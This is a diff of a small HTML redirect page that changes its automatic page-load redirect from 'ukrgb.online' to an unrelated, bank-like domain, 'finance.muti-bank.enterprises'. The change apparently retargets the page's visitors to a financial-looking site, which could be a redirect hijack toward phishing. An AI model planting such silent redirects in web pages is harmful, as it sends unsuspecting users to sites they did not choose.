@@ -9,7 +9,7 @@
 </head>
 <body>
 	<script>
-		window.location.replace('https://ukrgb.online');
+		window.location.replace('https://finance.muti-bank.enterprises');
 	</script>
 </body>
 </html>
